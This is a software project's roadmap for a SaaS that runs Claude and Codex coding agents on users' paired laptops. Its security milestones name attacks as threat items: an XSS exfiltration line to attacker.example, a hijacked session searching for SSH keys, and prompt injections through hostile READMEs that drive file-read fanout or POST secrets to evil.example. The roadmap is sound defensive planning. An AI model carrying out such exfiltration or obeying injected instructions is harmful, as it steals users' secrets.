# Roadmap

The product today is a working multi-user SaaS: a cloud-hosted web UI
(`agent-web-mvp-renddi.fly.dev`) where users sign in with GitHub, pair their
own laptops via a device-code flow, and drive Claude / Codex agents that run
on those laptops with file-system access. Sessions and chat history survive
server restarts.

What's left is hardening, Codex feature parity, cross-platform daemon
validation, UX polish, and the breakouts that block real multi-instance
deployment (audit log, persistent message pruning, shared state for HA).

Tags:

- **P0** — blocks the next major capability
- **P1** — should land before the capability ships to more users
- **P2** — polish, can wait
- **R**  — research / unknowns

---

## Shipped

### M1 — Daemon owns agent spawning (commit `d3d0775`)

`RemoteRunner` in `server/agents/` forwards prompts over the existing
`/client` WS to a connected daemon, which runs Claude SDK (via an embedded
Node bridge script) or Codex on the user's own machine and streams output
back. Six `daemon_*` message types, runId-keyed for cancel + permission
routing. Single-machine local mode still works when no daemon is connected
(dev / anon).

### M2 — Cloud deployment (commit `e907607`)

Multi-stage `Dockerfile` (`node:22-alpine`), tsx as a production
dependency, `fly.toml` pinned to a single always-on machine in `nrt` (256
MB shared-cpu-1x). Auto-generated GitHub Actions workflow at
`.github/workflows/fly-deploy.yml`. HTTPS + WSS work end-to-end via Fly's
proxy.

### M3 — GitHub OAuth + per-user device pairing (commit `46a8950`)

`better-sqlite3` opens at `DB_PATH` on a `/data` Fly volume. Schema tracks
`users`, `browser_sessions`, `device_tokens`, `pairing_codes`. Browser /ws
gated on `sid` cookie; daemon /client gated on Bearer device-token. New
`/pair` page approves a daemon-initiated code; `DeviceRegistry` and
`SessionStore` are scoped per `user_id` so one user never sees another
user's machines or chats. `agent-client login` drives the device-code flow
end-to-end (POST `/pair-init`, poll `/pair-status`, store the token).

### M4 — Persistence + resume across restart (commit `137e39d`)

`agent_sessions` + `agent_messages` tables. Sessions persist on create;
messages persist on append; `resume_token` lives on the session row so
Claude continues multi-turn context after the server reboots.
`SessionStore.rehydrate()` runs at boot, reconstructs in-memory Session
objects with full history at status='idle'.

### M4.5 — Security hotfix pass

Triggered by the audit done before opening up install-script-driven
onboarding. Five immediate fixes:

- **C-1** `Origin` allowlist on the `/ws` upgrade (browser only — `/client`
  has no Origin header from Go). Allowlist derived from `PUBLIC_URL` plus
  the Vite dev origin, overridable via `ALLOWED_ORIGINS`. Closes
  cross-site WebSocket hijacking (CSWSH) → otherwise any site a logged-in
  user visits could open an authenticated WS and drive `claude`/`codex`
  on their machine.
- **C-3** OAuth `return_to` constrained to same-origin relative paths via
  `safeReturnTo()`: must start with single `/`, rejects `//evil` and
  `/\evil`. Closes open redirect from `/auth/github?return_to=…`.
- **H-2** Boot guard: if `HOST=0.0.0.0` or `PUBLIC_URL` is https and
  GitHub OAuth env is unset, exit 1. Override with `ALLOW_ANON=1` for
  the rare deliberate case. Closes the "Fly deploy without secrets =
  every visitor shares one anon account that owns every paired daemon"
  failure mode.
- **H-6** `helmet` middleware with `frame-ancestors 'none'`, restricted
  CSP, and the usual defensive headers. Closes clickjacking of the
  permission-approval modal.
- **WS payload cap** — both servers run with `maxPayload: 1 MB` instead of
  the default 100 MB so a single hostile frame can't OOM the 256 MB Fly
  VM.

Body size on Express JSON is also capped at `1mb`.

### M4.6 — Auth + abuse-surface hardening

Follow-up to M4.5; closes the remaining critical/high items from the same
audit before opening up CLI-driven onboarding.

- **C-2** `pair-status` now returns the device token exactly once.
  Approved row transitions to a new `claimed` status via
  `claimPairingCode` *before* responding so a concurrent attacker poll on
  the same code sees `claimed` instead of the token. Pairing code length
  bumped from 8 → 12 chars over the same 32-symbol alphabet (~10^18
  space).
- **C-5** Device tokens are now `<id>.<secret>` (16+48 hex). `device_tokens`
  table stores only `secret_hash = sha256(secret)` and looks up by `id`;
  the `/client` upgrade verifies via constant-time compare. A leaked DB
  cannot impersonate any daemon. One-shot migration in `db.ts` drops the
  legacy row shape and forces an `agent-client login` on each daemon.
- **C-4** Codex agent is gated behind `CODEX_TRUST_DEFAULTS=1`. Server
  refuses to create codex sessions without it; daemon refuses to spawn
  codex without it. Operator must consciously vouch for their
  `CODEX_ARGS` (e.g. `--sandbox read-only --ask-for-approval on-request`)
  before exposing Codex. Proper in-UI Codex permission flow is still
  M5 P1.
- **H-4** `claude-bridge.mjs` resolves the SDK from the bridge script's
  directory and the Node global path only — the agent cwd is never
  consulted. Closes the "clone a hostile repo, prompt Claude in it,
  malicious `node_modules/@anthropic-ai/claude-agent-sdk` runs inside the
  daemon" RCE.
- **H-5** `express-rate-limit` on `/auth/github*`, `/api/device/pair-init`
  (5/min/IP), `/api/device/pair-status` (90/min/IP). `app.set('trust proxy', 1)`
  so Fly's edge IP doesn't collapse all clients into one bucket.

After M4.6, the install-script milestone (GoReleaser + curl|sh / iwr|iex)
can land safely.

### M4.7 — Token-budget defense + second-round audit fixes

Tier-1 follow-up to a token-budget threat model. The audit listed ~30
items; this milestone ships the six with the highest impact-to-effort
ratio. Rest deferred to **Milestone 10**.

- **B-2** Claude Agent SDK runs with `maxTurns: 25` per prompt. Hard cap
  on tool-use chains — defense against prompt-injection-driven fanout
  (e.g. a hostile README that tricks Claude into 200 chained file reads)
  and against runaway agent loops chewing through tokens. 25 is plenty
  for normal coding tasks (most resolve in <10).
- **B-3** Daemon-side wall-clock cap on a single run via
  `context.WithTimeout(defaultMaxRunDuration)` (30 min, overridable via
  `VVIBE_MAX_RUN_SECONDS`). Backstops the "tab went to sleep but the
  agent kept looping" case. `daemon_done` reports the timeout with a
  readable message instead of `context deadline exceeded`.
- **O-3** "Stop all (N)" emergency-brake button appears in the sidebar
  whenever ≥1 session is `running` or `awaiting_permission`. Server-side
  `cancel_all` message iterates `store.listForUser(userId)` and calls
  `.cancel()` on each active session. One click brake for "I think
  something's wrong" without hunting through individual sessions.
- **N-1** Cross-tenant guard on `pendingDirListings`. Map now keys on
  `(requestId, userId)` so a malicious user's daemon can't brute-force
  the 6-char requestId space and inject directory entries into another
  user's picker.
- **N-3** Install script substitution uses `PUBLIC_URL` instead of
  `req.get('host')`. Host is attacker-controllable in principle, and a
  quote/newline in it would break out of the single-quoted shell/PS
  string in install.sh/.ps1 — at minimum a supply-chain-style trust
  assumption we don't need.
- **N-8** `GET /auth/logout` removed; only POST remains. Eliminates
  `<img src=".../logout">` CSRF nuisance from third-party pages.
  Frontend now POSTs via `fetch` and navigates to `/`.

### M4.7 follow-up — Model picker + ANSI strip

Two small UX gaps that showed up immediately after M4.7 shipped:

- **Model selection** end-to-end. `NewSessionDialog` gains a "Model" dropdown
  (only when agent = Claude) listing the current Claude family — Opus 4.7 /
  Sonnet 4.6 / Haiku 4.5 — with "Default" as the no-pick option (lets the
  SDK pick, currently Opus). Picked model flows through `create_session` →
  `Session` (persisted in `agent_sessions.model`) → `RemoteRunner` →
  `daemon_run_prompt` → bridge → SDK `options.model`. Server-side allowlist
  via `isAllowedClaudeModel` in `shared/types.ts` rejects anything outside
  the dropdown, so a malicious client can't pass arbitrary strings to the
  SDK. Local `ClaudeRunner` (anon dev path) honors the same field, plus
  picks up the `maxTurns: 25` cap so dev mirrors prod.
- **Strip ANSI on tool output.** CLI tools like `npx skills` emit color +
  cursor + spinner escape sequences (`\x1b[34m`, `\x1b[?25l`, `\x1b[999D[J`).
  The leading ESC gets dropped by HTML rendering, leaving `[34m...[39m`
  garbage in the chat log. `ChatPane.MessageBubble` now runs a regex
  strip on `tool_use` / `tool_result` roles only (user/assistant prose
  shouldn't contain ANSI; skipping them saves regex work per render).
  The stored text is unchanged so a future ansi-to-html renderer can
  drop in.

### M4.8 — One-line daemon installer + CLI rename to `vvibe`

GoReleaser config (`client-go/.goreleaser.yaml`) builds the daemon for
linux/darwin/windows × amd64/arm64, archives without version in the
filename so `releases/latest/download/<asset>` always resolves, writes a
`checksums.txt`. GitHub Actions workflow `.github/workflows/release-client.yml`
fires on `client-v*` tags.

`server/public/install.sh` and `install.ps1` are served by Express at
`/install.sh` and `/install.ps1` (text/plain). They detect OS/arch,
download from GitHub Releases, verify sha256, and place the binary
on PATH. Neither runs `login` or `install` for the user — both need
a TTY (or admin PowerShell) and surprising the user there is worse than
the extra step.

Daemon `main.go` learns `version`/`commit`/`date` vars set via ldflags.
`agent-client version` now prints all three.

The first usable URL is:

```
curl -fsSL https://agent-web-mvp-renddi.fly.dev/install.sh | sh
iwr https://agent-web-mvp-renddi.fly.dev/install.ps1 | iex
```

To cut a release: `git tag v0.1.0 && git push --tags`. We initially tried
a `client-` prefix to separate daemon and server tags, but GoReleaser
OSS rejects non-semver tags (its prefix-stripping `monorepo.tag_prefix`
is Pro-only). If the server ever needs versioned tags later, give them
a different prefix like `server-v*`.

### M4.9 — `vvibe upgrade` self-update

[`creativeprojects/go-selfupdate`](https://github.com/creativeprojects/go-selfupdate)
fetches the latest release from GitHub, downloads the per-OS/arch
archive, sha256-verifies against `checksums.txt`, and atomically
replaces the running binary. `upgrade` stops the kardianos service
(if installed + running), swaps the file, then starts it again.

`upgrade --check` reports without applying. `upgrade --yes` skips the
y/N prompt for scripted use; non-TTY stdin without `--yes` refuses
rather than guessing.

Background / automatic update is intentionally not in scope — needs
code signing first so each update doesn't re-trigger SmartScreen /
Gatekeeper.

### M4.8 follow-up — CLI renamed to `vvibe`

Renamed the CLI from `agent-client` to **`vvibe`** in the same pass:
binary name, service ID (`Vvibe`), config dir (`~/.config/vvibe/`),
asset filenames (`vvibe_<os>_<arch>.<ext>`), and every user-facing string
in help/UI. Existing daemons must `uninstall` the old `AgentWebClient`
service and re-pair; this is acceptable because M4.6 already forced a
re-pair via the device-token hash migration.

---

## Open

### Milestone 5 — Codex parity

**Why:** today Codex is "stateless per prompt" and has no permission UI.

- **P0** Switch from `codex exec "<prompt>"` to `codex exec --json` (stream-
  json output). Adapter parses the same shape as Claude.
- **P0** Move stderr UTF-8 / CP950 decoding (lost in the M1 daemon rewrite)
  into a small utility on the daemon side using
  `golang.org/x/sys/windows.MultiByteToWideChar`. The current daemon Codex
  runner passes raw bytes through, so localized error messages on Windows
  render as mojibake.
- **P1** Codex session resume (multi-turn chat memory). The Session
  already persists a `resume_token` field — wire the Codex CLI's resume
  flag through `daemon_run_prompt` + `runner_codex.go`.
- **P1** Surface Codex's own approval flow in the UI (it has
  `--ask-for-approval` modes). Either route through our permission modal
  or expose its yes/no inline.

### Milestone 6 — Cross-platform daemon validation

**Why:** the Windows SCM register/install/run path is the only one
end-to-end tested; M1's Node-bridge approach also assumes Node is on PATH.

- **P0** macOS install / reboot / register / uninstall on Apple-silicon
  and Intel boxes. Confirm Gatekeeper handling for the unsigned binary.
- **P0** Linux install on at least Ubuntu + Arch (systemd user service).
  `sudo loginctl enable-linger $USER` to confirm pre-login start works.
- **P1** Code-signing pipeline for macOS (Developer ID + notarisation)
  and Windows (Authenticode). Without these the daemon is annoying to
  install.
- **P1** Make the Claude bridge work when Node isn't on PATH. Today it's
  spawned via `exec.LookPath("node")`. Options: bundle a tiny Node
  runtime (~50 MB), depend on the user having Claude CLI installed (which
  pulls Node), or document the assumption clearly.
- **P1** Fix `agents=none` when the daemon runs as a Windows service.
  Carry-over from the previous-session ROADMAP — service runs as
  `LocalSystem`, can't see the user's PATH, so `exec.LookPath("claude")`
  fails. Options: install via Task Scheduler under the user account, or
  store absolute paths to the agent binaries in `client.json`.

### Milestone 7 — UX gaps

**Why:** quality-of-life things flagged during MVP validation.

- **P2** Show connected devices in the web UI. Hello already carries
  `displayName`; the UI just doesn't render the list. Useful when a user
  has more than one machine.
- **P2** Device picker on new-session if the user has multiple daemons.
  `DeviceRegistry.pickRunner(userId)` currently returns the first.
- **P2** `agent-client status` returns "Access is denied" without admin
  on Windows because it queries SCM. Fall back to `sc query` for the read
  path, or remember the install location and probe the OS-appropriate way.
- **P2** File / dir browser when picking `cwd` for a new session (today
  it's a free-text input that's easy to mistype).
- **P2** File-diff viewer for `Edit` tool use results.
- **P2** Notifications when a permission request lands (browser
  `Notification` API; the UI is otherwise easy to leave open and miss).
- **R**  Tauri tray app to wrap the daemon with a visible icon, login UI,
  device naming. Includes the code-signing work above.

### Milestone 8 — Reliability & ops

- **P0** Rate-limit `/api/device/pair-init`. Today anyone can spam it and
  fill the `pairing_codes` table; expiry sweeps clean up but the burst
  cost is unbounded.
- **P1** Reconnect on the browser side: `WSClient` does exponential
  backoff up to 10s; verify it survives long backgrounded tabs and
  laptop sleeps. (Also check cookie expiry vs. WS lifetime — sid cookie
  is 30 days but a stale session would still get 401 on upgrade.)
- **P1** Daemon heartbeat from server side: server should evict devices
  that miss N pongs.
- **P2** Pruning: keep last N messages per session in memory, the rest
  on disk; lazy-load on session select. Carried over from M4 P1.
- **P2** Audit log of agent invocations (who, when, what cwd, what
  tools). Carried over from M3 P2.
- **P2** Export / import a session as JSON (debugging, support).
- **P2** Structured logs (JSON to stderr in prod), shipped via the
  daemon's log file or a cloud sink.
- **P2** Metrics: prompt count, tool invocations, error rate per session.

### Milestone 9 — Horizontal scale (when we actually need it)

**Why:** today everything's in a single Fly machine and `fly.toml` pins
`min_machines_running = 1` with no HA. The constraint is structural:
`DeviceRegistry` and the in-memory `RemoteRunner` correlation tables only
exist on the machine the daemon WS landed on. A browser routed to a
sibling machine has no path to the daemon.

- **R**  Pick a shared-state substrate. Cheapest: a Redis pub/sub fanout
  for `daemon_*` events keyed by `runId`, plus a `device_id → machine_id`
  lookup so a browser request can be sticky-routed or proxied.
- **R**  Or sidestep with sticky sessions at the Fly proxy layer — but
  Fly's HTTP-based affinity doesn't carry into long-lived WS, and
  daemon connection isn't tied to a browser session anyway.
- **P2** Until that lands, do not raise `min_machines_running`.

### Milestone 10 — Token budget & deeper defense (deferred from M4.7)

**Why:** M4.7 shipped the six highest-leverage items from a token-budget
threat model + second-round security audit. The rest below — observability,
per-user quotas, daemon-side belt-and-braces, supply-chain hardening — are
the medium-complexity / longer-tail items from that same audit. Some land
in adjacent milestones (e.g. cwd allowlist sits between this and M6).

#### Observability + user-visible budget

- **P0** **O-1 / O-2** Per-session token + cost counting. Claude Agent
  SDK's `result` message carries `usage` and `total_cost_usd`; pipe it
  through `daemon_done` and accumulate on `Session`. Add a user setting
  "daily budget $X" — soft warning at 80%, server-side hard refusal at
  100% (must explicitly raise to continue). Codex CLI doesn't surface
  usage today, so it falls back to a prompts/day quota.
- **P1** **O-5** Audit log UI: "Last 30 days" page listing prompt time,
  cwd, token/cost, device, IP. We already store `agent_sessions` +
  `agent_messages`; this is mostly read-side.
- **P2** **O-4** Anomalous-activity detector + forced re-OAuth (IP
  country jump, UA flip, prompt rate ≫ historical baseline). Needs the
  `auth_events` table first.

#### Per-user rate limiting

- **P0** **B-5** WebSocket rate limit. HTTP endpoints have one, WS
  `send_prompt` doesn't. Per-(userId, sessionId) token bucket, ~10/min.
- **P1** **B-1** `quota_events` table for per-user/session/day prompt
  caps. Cheap window query before each `enqueuePrompt`.
- **P2** **B-4** Cancel watchdog — re-evaluate after B-3 has been live
  for a while. If zombie runs persist past `cancel()` we add a 5s
  deadline + force-kill; otherwise skip.

#### Defense in depth

- **P0** **N-6** zod schema for `daemon_message` / `daemon_done`. Even
  a user's own malicious daemon can spoof `role: 'user'` to inject fake
  history rows; the JSON shape is currently trust-on-faith.
- **P1** **N-2** Tighten CSP `connect-src` from `ws:`/`wss:` (host
  wildcard) to `'self'`. Closes any future XSS → data exfil via
  `new WebSocket('wss://attacker.example/')`.
- **P1** **N-5** Origin middleware: refuse requests with no Origin
  header on state-changing endpoints (allowlist daemon endpoints
  separately). Today undefined Origin is permitted as a permissive
  default.
- **P1** **D-1** Daemon-side `budget.json` (per-hour prompts, per-run
  duration, daily soft/hard cap in USD). Daemon enforces independently
  of the server — even if our server is compromised, the user can't be
  billed past their local cap. The "we can't bill you past your local
  cap" story is also a marketing differentiator.
- **P2** **D-2** `vvibe usage` CLI: prints today's local-tracked
  spend regardless of server state. Side benefit of D-1.
- **P2** **L-7** Codex daemon: require `CODEX_ARGS` to contain
  `--sandbox` (and ideally `--ask-for-approval`) when
  `CODEX_TRUST_DEFAULTS=1`. Today setting trust-defaults without those
  args silently degrades to full-auto.

#### Tool / cwd scoping

- **P0** **H-3** Daemon cwd allowlist. `vvibe allow ~/code` adds a
  permitted root; daemon refuses any `cwd` outside the union of allowed
  roots. Closes "attacker hijacks session → `find / -name id_rsa`"
  paths. Bigger feature: needs CLI subcommand, config file format,
  startup-time validation, UI hint when a session targets a denied
  cwd.
- **P1** **P-5** Per-session tool allowlist. `NewSessionDialog`
  exposes a checkbox list; SDK takes `allowedTools`. Defaults to
  Read/Edit/Bash; WebFetch/WebSearch require an explicit opt-in. Cuts
  off "injected README tells Claude to POST secrets to evil.example"
  at the tool layer.
- **P2** **P-3** `cwd` change requires modal confirm (changing cwd =
  changing prompt-injection surface).

#### Onboarding + comms

- **P2** **A-1** Onboarding screen / docs: link to Anthropic Console
  → Settings → Monthly spend limit as the last-resort backstop. Pure
  docs.
- **P2** **A-4** Event push: "daily token total reached $X", "login
  from a new IP/UA", "daemon budget tripped". Start with in-UI banner;
  email later.

#### Supply chain (sits with M6)

- **R**  **N-4** Release trust root. `vvibe upgrade` currently trusts
  whoever can push to GitHub Releases. Add protected branches, OIDC +
  Sigstore/cosign, fine-grained PATs. Code-signing (already M6 P1) is
  the upstream half.

#### Won't do / consciously skipped

- **P-1** "User must be active in last N min to send prompt." Adds
  complexity; B-* gates cover the same threat model with less UX cost.
- **N-7** Pair-lookup info leak (any authed user can probe a code's
  device name). Pair codes are short-lived; signal value is low.
- **L-1 to L-6** Batched into a future "polish" cycle, not action-
  worthy on their own.

### Milestone 11 — Deployment portability

**Why:** today the only production-tested deployment is Fly.io (`fly.toml`,
single 256 MB `nrt` machine). The `Dockerfile` is generic, but no other
target has been validated end-to-end, the README hard-codes the Fly URL,
and a prospective self-hoster who doesn't want to use Fly has to figure it
out from scratch.

A Workers + Durable Objects + D1 alternative was evaluated (May 2026) and
consciously rejected: it would lock self-hosters onto Cloudflare and
contradict the "self-hostable" claim that drove the project's open-source
positioning in the first place. This milestone widens the set of "where
can I run this?" answers along the *container-PaaS* axis while keeping
the Fly path intact and not committing to any cloud-proprietary primitive.

Orthogonal to **Milestone 9 (horizontal scale)** — each target still
inherits the single-process `DeviceRegistry` constraint. This milestone
is about more *places* to put one machine, not more *machines*.

- **P0** **Validate `@anthropic-ai/claude-agent-sdk` on non-Fly runtimes.**
  The server-local fallback path (anon dev mode in `server/agents/claude.ts`)
  imports the SDK directly; the daemon bridge spawns it as a subprocess.
  Confirm both paths work inside a vanilla `node:22-alpine` container
  running on Cloud Run / Railway / a Hetzner VPS — no Fly-specific
  assumptions about network, fs, or process model. Prerequisite for
  everything below; if it doesn't work somewhere, that target gets
  dropped early instead of late.

- **P0** **Cloudflare Containers deployment recipe.** Same `Dockerfile`,
  add the CF Containers config + `docs/deploy/cloudflare-containers.md`.
  Verify: persistent volume equivalent for `/data/app.db`, long-lived
  WS connection lifetime (no idle eviction), `PUBLIC_URL` / `ALLOWED_ORIGINS`
  env wiring. If first-class persistent storage isn't available, document
  the external-SQLite fallback (Turso / Tigris) rather than papering over.

- **P0** **README "Deploy" section restructured.** From "deploy to Fly"
  to a short matrix of validated targets with one-line trade-off blurbs
  (idle cost, scale-to-zero, region, persistent storage). "Validated"
  means there's a tested recipe in `docs/deploy/<target>.md`. Anything
  not in the matrix stays out of the claim surface.

- **P1** **Generic VPS / docker-compose recipe.** Target persona: Hetzner
  / DigitalOcean / OCI Free Tier owner. `docs/deploy/vps.md` plus a
  reference `docker-compose.yml`: Caddy fronts both `/ws` and `/client`
  upgrades with auto-TLS, named volume for `/data`, `.env` template
  driving `PUBLIC_URL` and the GitHub OAuth creds. This is the
  deployment most aligned with the "true self-host" persona — the one
  that justifies refusing the B route.

- **P1** **Google Cloud Run recipe.** Only mainstream PaaS that
  scale-to-zeros *and* supports WebSockets — biggest cost win for
  low-traffic instances. Caveat: Cloud Run caps a single WS connection
  at 60 minutes and then forces a reconnect. Validate that `client-go`
  reconnect resumes cleanly and that an in-flight `runId` doesn't get
  orphaned across the cap. If it does, surface it as M8 reliability
  work and gate this recipe behind that fix.

- **P1** **Railway / Render quickstart.** One-click GitHub-repo deploys
  on both; mostly a matter of adding `railway.json` / `render.yaml`
  and the corresponding "Deploy" buttons. Low effort but doesn't expand
  the universe much — same shape as Fly, different vendor.

- **P2** **Deploy buttons in the README** for everything in the validated
  matrix. Low engineering cost, disproportionate perceived-credibility
  cost when missing.

- **P2** **Per-target cost & ops notes.** Short paragraph or table in
  each `docs/deploy/<target>.md`: "For 1–20 users you'll pay ~$X/mo on
  this target; egress matters above 100 GB/mo; for 100+ users see
  M9 first." Stops users from picking the wrong target for their use
  case.

- **R**  **Single-binary server distribution.** Bundle Node +
  `server/*.ts` into one statically-linked executable
  (`pkg` / `nexe` / Bun `--compile`). Goal: `wget vvibe-server-linux-x64 &&
  ./vvibe-server` on any VPS — no Docker, no Node toolchain. Mirrors
  the daemon's GoReleaser story. Open questions: better-sqlite3's
  native binding, the install-script-serving path, final image size.

- **R**  **External-storage fallback for scale-to-zero targets.** If
  Cloud Run scale-to-zero is to be more than "the volume keeps the
  machine warm", `/data/app.db` needs an off-machine home. Evaluate
  Turso (libSQL — drop-in for better-sqlite3 in many spots), Tigris,
  or managed Postgres + drizzle/Kysely abstraction. Tracks closely
  with M9's shared-state work — if the abstraction lands there, this
  comes nearly for free.

---

## Cross-cutting follow-ups (caught during M1–M4 implementation)

- **/client endpoint trust**: a leaked `device_token` lets anyone
  impersonate that user's daemon. Currently tokens never rotate or
  expire. Add a "revoke device" action in the UI + a rotation mechanic
  before any wider rollout.
- **Local server fallback**: when no daemon is connected for an authed
  user, sessions go to `RemoteRunner` which errors immediately with
  "No daemon connected." That's intentional — but the UI doesn't pre-empt
  it with "Pair a device first." Worth a banner.
- **Windows file-content visibility weirdness** observed during M3 token
  debugging: PowerShell `Get-Content` and the Go binary's `loadConfig()`
  reported divergent contents for `client.json` for a brief window
  (Get-Content showed empty token; show-config showed the real token,
  same path). Couldn't isolate to OneDrive vs. Defender vs. FS cache.
  Worth re-checking if it recurs.
